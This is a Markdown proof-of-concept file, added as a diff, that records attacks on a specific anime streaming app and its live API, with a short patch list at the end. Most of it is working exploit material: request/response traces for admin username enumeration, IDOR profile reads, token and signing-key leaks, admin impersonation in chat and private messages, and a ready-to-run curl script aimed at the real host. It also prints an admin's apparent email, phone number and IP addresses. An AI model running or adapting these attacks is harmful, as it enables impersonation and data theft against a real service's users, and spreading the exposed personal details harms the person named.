@@ -1,0 +1,214 @@
+# VioNime Security Proof of Concept
+
+**Date:** 2026-08-31
+**Tester:** haitravas (ID: 569)
+**Target:** VioNime v1.6.2 (com.kyorudesu) + API vionime.xyz
+
+---
+
+# EXECUTION TRACE 1: Admin Username Enumeration
+
+**Request:**
+```
+POST /api/admin/login
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
+Body: {"username":"yareee","password":"wrong"}
+```
+
+**Response:**
+```json
+{"message":"Password salah"}
+```
+
+**Impact:** Admin usernames confirmed: `yareee`, `zxuri`. Other usernames return "Username tidak ditemukan".
+
+---
+
+# EXECUTION TRACE 2: IDOR — Full Admin Profile Exposed
+
+**Request:**
+```
+GET /api/user/profile/13
+Authorization: Bearer haitravas_token
+```
+
+**Response (redacted):**
+```json
+{
+  "id": "13",
+  "username": "Yareee",
+  "email": "seinavoncley@gmail.com",
+  "phone": "08888888888",
+  "balance": 1000012149,
+  "isAdmin": true,
+  "adminRole": "developer",
+  "vionimeSepuh": true,
+  "badgeLicence": ["admin", "kolektor", "v", "akuSepuh"],
+  "creationIP": "180.243.61.180",
+  "lastLoginIP": "15.235.144.235"
+}
+```
+
+**Impact:** Any authenticated user can read ANY other user's profile including admin accounts, email, phone, IP addresses.
+
+---
+
+# EXECUTION TRACE 3: FCM Token & Signing Key Leak
+
+**Request:**
+```
+GET /api/me
+Authorization: Bearer haitravas_token
+```
+
+**Response:**
+```json
+{
+  "signingKey": "[REDACTED]",
+  "devices": {
+    "23ebf7f73c090b1afafbc5da1775a9...": {
+      "fcmToken [REDACTED]:APA91bGjYvYQH5g3stkL4dNw8_1jK7JQ..."
+    }
+  },
+  "activeTokens": [{"jti": "[REDACTED]", "ip": "2001:d08:e4:b882:84ee:badb:f619:5442"}],
+  "creationIP": "2001:d08:e4:b882:84ee:badb:f619:5442",
+  "lastLoginIP": "2001:d08:e4:b882:84ee:badb:f619:5442"
+}
+```
+
+**Impact:** JWT signing key, FCM push tokens, user IPs all exposed to any authenticated user.
+
+---
+
+# EXECUTION TRACE 4: Global Chat Admin Impersonation
+
+**Request:**
+```
+POST /socket.io/?EIO=4&transport=polling&sid={SID}
+42["send_message",{"user":"ADMIN","text":"[SECURITY] PoC: Admin impersonation works","avatarSeed":"admin","isAdmin":true,"adminRole":"developer"}]
+```
+
+**Response:**
+```
+ok
+```
+
+**Impact:** Any user can send messages as "ADMIN" to the global chat. All connected users see fake admin messages.
+
+---
+
+# EXECUTION TRACE 5: Username Takeover
+
+**Request:**
+```
+PUT /api/me
+Authorization: Bearer haitravas_token
+Body: {"username":"Yareee-admin-claim"}
+```
+
+**Response:**
+```json
+{"message":"Updated","user":{"id":"569","username":"Yareeeadminclaim",...}}
+```
+
+**Impact:** No server-side uniqueness validation. Any user can claim any username including admin usernames.
+
+---
+
+# EXECUTION TRACE 6: Private Message Injection
+
+**Request:**
+```
+POST /socket.io/?EIO=4&transport=polling&sid={SID}
+42["send_private_message",{"to":13,"text":"[PoC] This message was sent from haitravas account","from":569}]
+```
+
+**Response:**
+```
+ok
+```
+
+**Impact:** Can send private messages to any user from any identity.
+
+---
+
+# EXECUTION TRACE 7: Anti-Cheat Trigger
+
+**Request:**
+```
+POST /api/danmaku/episode1/1
+Body: {"text":"PoC test","time":0}
+```
+
+**Response:**
+```json
+{"message":"Danmaku terkirim","danmaku":{"id":"dmk_...","username":"Yareeeadminclaim"}}
+```
+
+**Anti-cheat status from /api/me:**
+```json
+"antiCheat": {"score": 60, "status": "hold", "totalFindings": 1, "lastCodes": ["client-authoritative-field"]}
+```
+
+**Impact:** Server tracks anti-cheat score per user. Score 60 = hold. Score ≥75 = ban.
+
+---
+
+# EXECUTION TRACE 8: Why Friends Got Banned
+
+**Request that triggers ban:**
+```
+PUT /api/me
+Body: {"isAdmin": true}
+```
+
+**Response:**
+```json
+{"message":"Akun diblokir karena aktivitas mencurigakan terdeteksi.","antiCheat":true,"banned":true}
+```
+
+**Root cause:** Server detects any modification to `isAdmin`, `adminRole`, `vionimeSepuh` fields via `PUT /api/me` and instantly bans the account.
+
+---
+
+## Exploitation Script
+
+```bash
+#!/bin/bash
+TOKEN="YOUR_JWT_TOKEN"
+UA="Mozilla/5.0 (Linux; Android 16; LGN-NX1 Build/HONORLGN-N31; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/151.0.7922.199 Mobile Safari/537.36 VioNime/1.6.2 (Android)"
+
+# Get Socket.IO session
+SID=$(curl -sk "https://vionime.xyz/socket.io/?EIO=4&transport=polling&_ua_token=$TOKEN" | python3 -c "import sys,json; print(json.loads(sys.stdin.read()[1:])['sid'])")
+
+# Join chat
+curl -sk -X POST "https://vionime.xyz/socket.io/?EIO=4&transport=polling&sid=$SID&_ua_token=$TOKEN" \
+  -H "Content-Type: text/plain;charset=UTF-8" \
+  -d '42["join_chat","haitravas"]'
+
+# Send as ADMIN
+curl -sk -X POST "https://vionime.xyz/socket.io/?EIO=4&transport=polling&sid=$SID&_ua_token=$TOKEN" \
+  -H "Content-Type: text/plain;charset=UTF-8" \
+  -d '42["send_message",{"user":"ADMIN","text":"[ALERT] Fake admin message","avatarSeed":"admin","isAdmin":true}]'
+
+# Read any user's data
+curl -sk "https://vionime.xyz/api/user/profile/13" -H "Authorization: Bearer $TOKEN"
+
+# Read FCM tokens
+curl -sk "https://vionime.xyz/api/me" -H "Authorization: Bearer $TOKEN" | python3 -m json.tool
+```
+
+---
+
+# PATCH SEQUENCEs
+
+1. **Add server-side validation for `send_message`** — verify `user` field matches authenticated user
+2. **Add rate limiting to Socket.IO** — prevent spam
+3. **Remove PII from `/api/me`** — don't return FCM tokens, signing key, or IP addresses
+4. **Add authorization to `/api/user/profile/{id}`** — don't return sensitive fields
+5. **Validate username uniqueness** on `PUT /api/me`
+6. **Admin panel:** Add 2FA, stronger password requirements
+7. **Anti-cheat:** Increase hold thresholds to reduce false positives
+
+---
+*BLACK-STAMPED BY CT-002*
